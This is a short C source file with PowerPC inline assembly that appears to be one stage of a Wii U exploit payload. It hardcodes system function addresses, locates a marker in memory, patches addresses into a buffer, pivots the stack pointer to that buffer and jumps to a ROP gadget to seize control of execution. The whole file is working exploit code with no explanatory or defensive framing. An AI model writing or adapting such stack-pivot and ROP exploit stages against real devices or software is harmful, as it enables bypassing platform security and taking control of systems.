#define __PPCExit ((void (*)())0x01018940)
#define OSFatal ((void (*)(char* msg))0x01027908)
#define __os_snprintf ((int(*)(char* s, int n, const char * format, ... ))0x01026014)
#define rop ((void (*)())0x0E6C3A44)
#define memcpy ((void * (*)(void * destination, const void * source, int num))0x01029E84)

#define BUFFER_ADDR 0x1dd7b814
#define CODE_START	0xCAFECAFE

void start()
{
    asm("stwu %r1,-0x2000(%r1)");
    unsigned int * start = (unsigned int*)BUFFER_ADDR;
    int i;
  
    for (i = 0; i < 150; start += 1) {
        if (*start == CODE_START) i++;
    }
    
    memcpy((void *)BUFFER_ADDR, (void *)BUFFER_ADDR + 0x800, 0x600);
    
	unsigned int * code_addr_1 = (unsigned int *)(BUFFER_ADDR + 0x2C);
    unsigned int * code_addr_2 = (unsigned int *)(BUFFER_ADDR + 0x44);    
	unsigned int * code_addr_3 = (unsigned int *)(BUFFER_ADDR + 0x54);
    unsigned int * code_addr_4 = (unsigned int *)(BUFFER_ADDR + 0x7C);    
    *code_addr_1 = (int)start;
    *code_addr_2 = (int)start;
	*code_addr_3 = (int)start;
	*code_addr_4 = (int)start;
	
    asm(
        "lis %r1, 0x1dd7 ;"
        "ori %r1, %r1, 0xb814 ;"
    );
    rop();

    // Debug printing
    //char msg[255];
    //__os_snprintf(msg, 255, "0x%08x 0x%08x", *code_addr_1, start);
    //OSFatal(msg);
}